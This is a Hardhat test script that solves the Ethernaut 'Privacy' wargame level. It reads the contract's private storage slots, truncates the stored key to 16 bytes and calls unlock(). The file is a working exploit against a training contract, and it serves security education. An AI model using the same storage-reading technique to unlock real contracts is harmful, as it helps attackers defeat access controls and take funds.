import { expect } from "chai";
import { Contract, Signer, BigNumber } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel, bigNumberToEther, logEvents } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Privacy`);
  const challengeAddress = await createChallenge(
    `0x11343d543778213221516D004ED82C45C3c8788B`
    // IMPORTANT: Some contracts will need a second argument specifying how
    // much value that should have in them on creation. e.g. Reentrance level e.g.
    // , ethers.utils.parseEither("0.001")
  );

  challenge = await challengeFactory.attach(challengeAddress);

//  const attackerFactory = await ethers.getContractFactory(`YourAttackerSourceFile`);
//  attacker = await attackerFactory.deploy(challenge.address);
});

it("solves the challenge", async function () {
  let provider: any = eoa.provider;
  let data: Array<string> = []
  let i: number;
  const HEXDIGITS_PER_BYTE : number = 2;
  const PREFIX : string = "0x";

  for (i = 0; i < 3; i++) {
    data[i] = await provider.getStorageAt(challenge.address, i + 3);
  }
  // convert to byte16
  tx = await challenge.unlock(PREFIX + data[2].substring(PREFIX.length, PREFIX.length + 16*HEXDIGITS_PER_BYTE));
  await tx.wait();

});

after(async () => {
  expect(await submitLevel(challenge.address), "level should be solved").to.be.true;
});
